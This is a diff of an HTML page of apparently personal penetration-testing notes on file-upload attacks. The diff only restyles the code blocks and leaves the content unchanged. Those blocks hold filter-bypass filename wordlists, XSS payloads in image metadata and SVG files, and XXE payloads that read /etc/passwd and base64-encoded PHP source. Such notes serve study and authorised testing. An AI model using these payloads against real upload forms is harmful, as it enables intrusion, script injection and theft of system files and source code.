@@ -1430,20 +1430,20 @@
 </table>
 <p><strong>Note:</strong> A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.</p>
 <h3 id="creating-character-injection-wordlist">Creating Character Injection Wordlist</h3>
-<div class="highlight"><pre><span></span><code><span class="k">for</span><span class="w"> </span>char<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;%20&#39;</span><span class="w"> </span><span class="s1">&#39;%0a&#39;</span><span class="w"> </span><span class="s1">&#39;%00&#39;</span><span class="w"> </span><span class="s1">&#39;%0d0a&#39;</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span><span class="s1">&#39;.\\&#39;</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="s1">&#39;…&#39;</span><span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">    </span><span class="k">for</span><span class="w"> </span>ext<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;.php&#39;</span><span class="w"> </span><span class="s1">&#39;.phps&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="c1"># can add more php ext here</span>
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$char$ext</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$ext$char</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$char$ext</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$ext$char</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
-<span class="w">    </span><span class="k">done</span>
-<span class="k">done</span>
-</code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="k">for</span><span class="w"> </span>char<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;%20&#39;</span><span class="w"> </span><span class="s1">&#39;%0a&#39;</span><span class="w"> </span><span class="s1">&#39;%00&#39;</span><span class="w"> </span><span class="s1">&#39;%0d0a&#39;</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w"> </span><span class="s1">&#39;.\\&#39;</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="s1">&#39;…&#39;</span><span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span>ext<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;.php&#39;</span><span class="w"> </span><span class="s1">&#39;.phps&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="c1"># can add more php ext here</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$char$ext</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell</span><span class="nv">$ext$char</span><span class="s2">.jpg&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$char$ext</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;shell.jpg</span><span class="nv">$ext$char</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="k">done</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="k">done</span>
+</span></code></pre></div>
 <h3 id="limiting-content-type-wordlist-example">Limiting Content-Type wordlist example</h3>
-<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
-cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>image-content-types.txt<span class="w"> </span><span class="c1"># method 1</span>
-cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xclip<span class="w"> </span>-se<span class="w"> </span>c<span class="w"> </span><span class="c1"># method 2</span>
-</code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>wget<span class="w"> </span>https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>image-content-types.txt<span class="w"> </span><span class="c1"># method 1</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;image/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xclip<span class="w"> </span>-se<span class="w"> </span>c<span class="w"> </span><span class="c1"># method 2</span>
+</span></code></pre></div>
 <h2 id="limited-uploads">Limited Uploads</h2>
 <ul>
 <li>Secure filters not exploitable with above techniques</li>
@@ -1475,35 +1475,35 @@ cat<span class="w"> </span>web-all-content-types.txt<span class="w"> </span><spa
 <ul>
 <li>Adding XSS payload to an image's metadata:</li>
 </ul>
-<div class="highlight"><pre><span></span><code>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s1">&#39; &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#39;</span><span class="w"> </span>HTB.jpg
-exiftool<span class="w"> </span>HTB.jpg
-</code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s1">&#39; &quot;&gt;&lt;img src=1 onerror=alert(window.origin)&gt;&#39;</span><span class="w"> </span>HTB.jpg
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>exiftool<span class="w"> </span>HTB.jpg
+</span></code></pre></div>
 <ul>
 <li>Change the image's MIME-Type to text/html, web apps may show it as an HTML document instead of an image, thus the XSS payload would be triggered.</li>
 <li>Scalable Vector Graphics (SVG) images are XML-based. For this reason, we can modify their XML data to include an XSS payload: </li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span>
-<span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
-<span class="w">    </span><span class="nt">&lt;rect</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">fill=</span><span class="s">&quot;green&quot;</span><span class="w"> </span><span class="na">stroke=</span><span class="s">&quot;black&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
-<span class="w">    </span><span class="nt">&lt;script</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>alert(window.origin);<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/svg&gt;</span>
-</code></pre></div>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="cp">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="nt">&lt;rect</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;1&quot;</span><span class="w"> </span><span class="na">fill=</span><span class="s">&quot;green&quot;</span><span class="w"> </span><span class="na">stroke=</span><span class="s">&quot;black&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="nt">&lt;script</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span>alert(window.origin);<span class="nt">&lt;/script&gt;</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
 <h3 id="xxe">XXE</h3>
 <ul>
 <li>SVG/XML example:</li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><span class="w"> </span>]&gt;
-<span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
-</code></pre></div>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
 <ul>
 <li>Another example but to read the web apps source code:</li>
 </ul>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-<span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</span><span class="w"> </span>]&gt;
-<span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
-</code></pre></div>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="cp">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nt">&lt;svg&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
 <ul>
 <li>View page source of the upload page to see the returned file from above payload.</li>
 <li>PDF, Word Documents, PowerPoint Documents all include XML elements.</li>
